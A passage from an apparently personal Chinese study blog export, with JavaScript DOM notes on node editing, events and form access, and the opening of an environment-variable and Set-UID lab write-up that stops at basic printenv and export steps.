class="keyword">var</span> name = node.<span class="property">src</span>.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> picName = name[name.<span class="property">length</span>-<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (picName==<span class="string">&quot;off.gif&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                node.<span class="property">src</span>=<span class="string">&quot;./pic/on.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">else</span></span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                node.<span class="property">src</span>=<span class="string">&quot;./pic/off.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改节点样式：</p><ul><li>Element.style.样式名</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>DOM样式的修订<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    元素节点.style.样式名=样式值；</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    js的样式名和css都是一样的，只不过如果样式名超过两个单词，js使用驼峰命名法来应用样式名，比如:css中的font-weight，在js中就会转变为:fontWeight.</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    只要认真学，编程就好学；只要练得多，编程就轻松。</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myclick()&quot;</span>&gt;</span>改变<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">myclick</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">var</span> node=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;red&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      node.<span class="property">style</span>.<span class="property">color</span>=<span class="string">&quot;red&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      node.<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&quot;3em&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      node.<span class="property">style</span>.<span class="property">fontWeight</span>=<span class="number">900</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>增加一个节点：</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//为按钮1绑定事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> botton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;button1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    botton.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//上述介绍的元素方法，但此方法代码冗长。</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// //添加什么标签，就写什么参数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// var li = document.createElement(&quot;li&quot;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// //添加标签的文本信息</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// var liText = document.createTextNode(&quot;这是常规方法添加的li节点&quot;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// //把文本信息添加到标签中去(将文本和标签拼接)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// li.appendChild(liText);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// //获取父节点对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// var place = document.getElementById(&quot;place&quot;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// //把li节点添加到父节点对象中去</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// place.appendChild(li);</span></span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//对上述代码优化：(优先使用这种方式！！！！！！！！)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//添加什么标签，就写什么参数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//直接通过li添加HTML信息</span></span></span><br><span class="line"><span class="language-javascript">        li.<span class="property">innerHTML</span> = <span class="string">&quot;&lt;li&gt;这是常规方法添加的li节点&lt;/li&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取父节点对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> place = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;place&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//把li节点添加到父节点对象中去</span></span></span><br><span class="line"><span class="language-javascript">        place.<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//为按钮buttonHTML绑定事件（此方法影响地方较大，可能会影响先前绑定的事件，不推荐使用）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> botton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;buttonHTML&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    botton.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取父节点对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> place = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;place&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        place.<span class="property">innerHTML</span> += <span class="string">&quot;&lt;li&gt;这是通过innerHTML来添加的标签&lt;/li&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//为按钮2绑定事件（在固定位置，li2之前创建节点）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> botton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;button2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    botton.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//添加什么标签，就写什么参数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//添加标签的文本信息</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> liText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;添加一个在li2之前的li标签&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//把文本信息添加到标签中去(将文本和标签拼接)</span></span></span><br><span class="line"><span class="language-javascript">        li.<span class="title function_">appendChild</span>(liText);</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//获取父节点对象和对应子节点对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> li2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;li2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> place = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;place&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//把li节点添加到父节点对象中去</span></span></span><br><span class="line"><span class="language-javascript">        place.<span class="title function_">insertBefore</span>(li,li2);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br></pre></td></tr></table></figure><blockquote><p>就是两种方式：</p><p>appendChild</p><p><code>appendChild</code> 方法在将节点添加到新的父元素时，会自动将该节点从原有位置移除。这是因为 DOM 规定一个节点不能同时存在于文档中的多个位置。所以，当你使用 <code>appendChild</code> 将一个节点添加到新的父元素时，它会从原有的位置被删除，然后被添加到新的位置。</p><p>insertBefore</p></blockquote></li></ul><p>focus  blur  实验1</p><h3 id="3-事件"><a href="#3-事件" class="headerlink" title="3. 事件"></a>3. 事件</h3><h4 id="1-事件的绑定"><a href="#1-事件的绑定" class="headerlink" title="1. 事件的绑定"></a>1. 事件的绑定</h4><ol><li>内联绑定</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>方法1：直接在元素上添加时间处理函数<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">onclick</span>=<span class="string">&quot;myClick()&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>外联绑定</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">h3</span>&gt;</span>方法2：事件侦听<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>我是一个命令按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">cument.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,mClick);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseover&quot;</span>,mMouin);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;mouseout&quot;</span>,mMouout);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">mClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;另外一种事件处理方式&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">mMouin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;yellow&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">mMouout</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&quot;deeppink&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>方法3：给元素的属性绑定事件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span>我通过属性绑定实现<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">document.getElementById(&quot;btn1&quot;).onclick=function()&#123;</span><br><span class="line">            alert(&quot;hello DOM&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><blockquote><p>一种是addListener的方式</p><p>一种是使用元素的”on事件“属性</p></blockquote><h4 id="2-事件捕获"><a href="#2-事件捕获" class="headerlink" title="2. 事件捕获"></a>2. 事件捕获</h4><p>从外向内执行</p><h4 id="3-冒泡"><a href="#3-冒泡" class="headerlink" title="3. 冒泡"></a>3. 冒泡</h4><p>从内向外响应</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>冒泡：父子嵌套元素定义了相同的事件，处理的顺序问题<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>默认情况:从内向外，冒泡<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;idbtn&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span></span><br><span class="line">            点我</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>通过设定修改顺序<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;idbtn1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span></span><br><span class="line">            点我</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;idbtn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,parClick);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,childClick);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">parClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;parent click&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">childClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;child click&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;idbtn1&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,parClick,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn1&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,childClick,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-表单获取"><a href="#4-表单获取" class="headerlink" title="4.表单获取"></a>4.表单获取</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JS 获取表单元素值的方法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;na&quot;</span> <span class="attr">id</span>=<span class="string">&quot;id1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hahaha&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;sel&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sel&quot;</span> <span class="attr">multiple</span> <span class="attr">size</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SCU&quot;</span>&gt;</span>四川大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;UESTC&quot;</span>&gt;</span>电子科技大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SWUFE&quot;</span>&gt;</span>西南财经大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SWJTU&quot;</span>&gt;</span>西南交大<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SICAU&quot;</span>&gt;</span>四川农业大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;CDUT&quot;</span>&gt;</span>成都理工大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SWPU&quot;</span>&gt;</span>西南石油大学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;out&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;方法1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;firstWay()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;方法2&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;secWay()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;方法3&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;thirdWay()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;方法4&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;fourthWay()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//元素.value</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">firstWay</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;out&quot;</span>).<span class="property">innerText</span>=a.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//id.value</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">secWay</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(id1.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//formName.elementName</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">thirdWay</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(form1.<span class="property">na</span>.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">fourthWay</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;hello fourth&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> node=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;sel&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> item=[];</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> x <span class="keyword">of</span> node)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (x.<span class="property">selected</span>)</span></span><br><span class="line"><span class="language-javascript">                    item.<span class="title function_">push</span>(x); </span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> x <span class="keyword">of</span> item )</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(x.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;    </span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Ajax理解："><a href="#Ajax理解：" class="headerlink" title="Ajax理解："></a>Ajax理解：</h4><p><img src="/2023/11/08/JS/image-20231109214041758.png" alt="image-20231109214041758"></p><blockquote><p>data是获取到的前端输入的值，flask中通过表单的方式获取数值，进行操作，返回一个json格式的数据；</p><p>该数据在success函数中作为参数被传入，结果进行相应的展示。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境变量实验</title>
      <link href="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/"/>
      <url>/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>本实验室的学习目标是让学生了解环境变量如何影响程序以及系</p><p>统行为。环境变量是一组动态命名值，可以影响正在运行的进程将在</p><p>计算机上运行。大多数操作系统都使用它们，因为它们是 1979 年引</p><p>入 Unix。尽管环境变量会影响程序行为，但它们是如何实现的这一点</p><p>很多程序员都不太理解。因此，如果程序使用环境变量程序员不知道</p><p>它们被使用，程序可能有漏洞。</p><p>在本实验室中，学生将了解环境变量是如何工作的，它们是如何</p><p>从父进程到子进程，以及它们如何影响系统&#x2F;程序行为。我们特别感</p><p>兴趣的是如何环境变量影响 Set-UID 程序的行为，这些程序通常是特</p><p>权程序。</p><p>本实验室涵盖以下主题：</p><p>•环境变量</p><p>•SET-UID 程序</p><p>•安全地调用外部程序</p><p>•能力泄漏</p><p>•动态加载程序&#x2F;链接器</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-Task-1-Manipulating-Environment-Variables"><a href="#一、-Task-1-Manipulating-Environment-Variables" class="headerlink" title="一、   Task 1: Manipulating Environment Variables"></a>一、   Task 1: Manipulating Environment Variables</h1><p>1.使用 printenv 命令打印出环境变量。</p><p>​               <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211744853.png" alt="image-20231104211744853">                </p><p>2.“ printenv PWD”查看指定环境变量</p><p> <img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/image-20231104211750356.png" alt="image-20231104211750356"></p><p>3.export设置环境变量</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 设置环境变量“TASK1”值为其地址“&#x2F;home&#x2F;seed&#x2F;Labsetup3”</p><p><img src="/2023/11/04/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%9E%E9%AA%8C/clip_image001.gif" alt="*"> 打印查看，设置成功</p><p> <img 